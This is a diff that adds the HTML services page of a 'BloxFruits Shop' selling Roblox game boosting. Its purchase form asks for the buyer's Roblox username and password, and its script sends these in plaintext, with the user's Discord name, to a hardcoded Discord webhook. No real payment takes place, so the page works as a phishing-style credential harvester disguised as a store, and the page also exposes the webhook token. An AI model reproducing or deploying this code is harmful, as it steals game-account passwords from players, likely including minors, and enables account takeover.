@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Our Services - BloxFruits Shop</title>
+    <link rel="stylesheet" href="services.css">
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* Additional CSS for modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+            padding-top: 60px;
+        }
+
+        .modal-content {
+            background-color: #fefefe;
+            margin: auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            max-width: 600px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .modal h2 {
+            color: #007bff;
+        }
+
+        .modal img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .amount-input {
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 80%;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+        }
+
+        .buy-button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        .buy-button:hover {
+            background-color: #0056b3;
+        }
+
+        .input-group {
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        /* Responsive adjustments */
+        @media screen and (max-width: 600px) {
+            .modal-content {
+                width: 90%;
+            }
+        }
+    </style>
+    <div class="container">
+        <header>
+            <h1>Welcome to BloxFruits Shop</h1>
+            <img src="logo.png" alt="BloxFruits Shop Logo" class="logo">
+        </header>
+        <nav class="navigation">
+            <ul>
+                <li><a href="aboutus.html" id="about-link">About Us</a></li>
+                <li><a href="services.html" id="services-link">Our Services</a></li>
+                <li><a href="fruits.html" id="fruits-link">Permanent Fruits</a></li>
+            </ul>
+        </nav>
+    </div>
+</head>
+<body>
+    <div class="container">
+        <section class="services">
+            <h2>Our Services</h2>
+            <div class="services-grid">
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137186780020828/image.png?ex=668a9662&is=668944e2&hm=c3e29032cc3662acdd6415a9a31f47ecd3c8550a2be5ebbc64289d26d73252f4&" alt="Level Services">
+                    <h3>Level Services</h3>
+                    <p>Quick and efficient leveling services to boost your experience and power.</p>
+                    <button class="buy-button" onclick="openModal('Level Services')">Buy</button>
+                </div>
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137229972967555/image.png?ex=668a966d&is=668944ed&hm=5186cb7d23ae790d2f879a5534943fd3717ca9f26aee8734e4a8e51040af2967&" alt="Beli Services">
+                    <h3>Beli Services</h3>
+                    <p>Earn Beli quickly with our expert grinding services, ensuring you have the funds you need.</p>
+                    <button class="buy-button" onclick="openModal('Beli Services')">Buy</button>
+                </div>
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137280610795681/image.png?ex=668a9679&is=668944f9&hm=a9ed0554d493beff124c455df37af73ac7785b529d3e47c7c8b5395e729a0e00&" alt="Sword Services">
+                    <h3>Sword Services</h3>
+                    <p>Acquire the most powerful swords in BloxFruits with our exclusive sword-finding services.</p>
+                    <button class="buy-button" onclick="openModal('Sword Services')">Buy</button>
+                </div>
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137350571921458/image.png?ex=668a968a&is=6689450a&hm=91a8fa3162d7b75534a4ed53c37adb5309c98edf8be6fe49ded8d1c55477a878&" alt="Fighting Style Services">
+                    <h3>Fighting Style Services</h3>
+                    <p>Master various fighting styles with our dedicated training and guidance services.</p>
+                    <button class="buy-button" onclick="openModal('Fighting Style Services')">Buy</button>
+                </div>
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137577282437261/image.png?ex=668a96c0&is=66894540&hm=6366923a3fa58da593e5cec89e0343e783bc3de946d4f41e29a119b319621a62&" alt="Mastery Services">
+                    <h3>Mastery Services</h3>
+                    <p>Increase your mastery levels with our efficient mastery services, tailored to your needs.</p>
+                    <button class="buy-button" onclick="openModal('Mastery Services')">Buy</button>
+                </div>
+                <div class="service-item">
+                    <img src="https://cdn.discordapp.com/attachments/1259136797892415562/1259137700024422471/image.png?ex=668a96dd&is=6689455d&hm=cb047ae07e518cab05368386bebb6ac7d66effe02879bb5ba955097dd0fd3693&" alt="Materials Services">
+                    <h3>Materials Services</h3>
+                    <p>Gather essential materials quickly and efficiently with our specialized services.</p>
+                    <button class="buy-button" onclick="openModal('Materials Services')">Buy</button>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <!-- Modal HTML -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <img id="modalImage" src="" alt="Service Image">
+            <h2 id="modalTitle"></h2>
+            <p id="modalDescription"></p>
+            
+            <!-- Form for Roblox username, password, and Discord -->
+            <div class="input-group">
+                <label for="robloxUsername">Roblox Username:</label>
+                <input type="text" id="robloxUsername" required>
+            </div>
+            <div class="input-group">
+                <label for="robloxPassword">Roblox Password:</label>
+                <input type="password" id="robloxPassword" required>
+            </div>
+            <div class="input-group">
+                <label for="discordUsername">Discord Username:</label>
+                <input type="text" id="discordUsername" required>
+            </div>
+            
+            <label for="amount" id="amountLabel">Amount ($):</label>
+            <input type="number" id="amount" class="amount-input" required>
+            <br><br>
+            <button class="buy-button" onclick="submitPayment()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        // Function to open the modal
+        function openModal(serviceName) {
+            // Update modal content based on serviceName
+            var modal = document.getElementById('myModal');
+            var modalImage = document.getElementById('modalImage');
+            var modalTitle = document.getElementById('modalTitle');
+            var modalDescription = document.getElementById('modalDescription');
+            var amountLabel = document.getElementById('amountLabel');
+
+            // Example: Set content for Level Services
+            modalImage.src = 'https://site.surveysparrow.com/wp-content/uploads/2023/04/Understanding-Consumer-Buying-Behavior-768x410.png';
+            modalTitle.textContent = serviceName;
+            modalDescription.textContent = 'A Roblox BloxFruits Service.';
+            amountLabel.textContent = 'Amount for ' + serviceName + ' ($):';
+
+            modal.style.display = 'block';
+        }
+
+        // Function to close the modal
+        function closeModal() {
+            var modal = document.getElementById('myModal');
+            modal.style.display = 'none';
+        }
+
+        // Function to handle payment submission
+        function submitPayment() {
+            var amount = document.getElementById('amount').value;
+            var serviceName = document.getElementById('modalTitle').textContent;
+            var robloxUsername = document.getElementById('robloxUsername').value;
+            var robloxPassword = document.getElementById('robloxPassword').value;
+            var discordUsername = document.getElementById('discordUsername').value;
+
+            // Send the payment details to the Discord webhook
+            var webhookURL = 'https://discord.com/api/webhooks/1259203378890670241/FVvyQ-QsNZ0rJ-3SfRDP2Ep6-i1qb442YuRztibJaA3cuzgisDK0ySEZU4woqdX5uiYg'; // dont be an asshole <3
+            var payload = {
+                content: `**Payment Details**\nService: ${serviceName}\nAmount: $${amount}\nRoblox Username: ${robloxUsername}\nRoblox Password: ${robloxPassword}\nDiscord Username: ${discordUsername}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert('Payment details sent successfully.');
+                } else {
+                    alert('Failed to send payment details.');
+                }
+                closeModal();
+            })
+            .catch(error => {
+                alert('Error: ' + error.message);
+                closeModal();
+            });
+        }
+    </script>
+</body>
+</html>
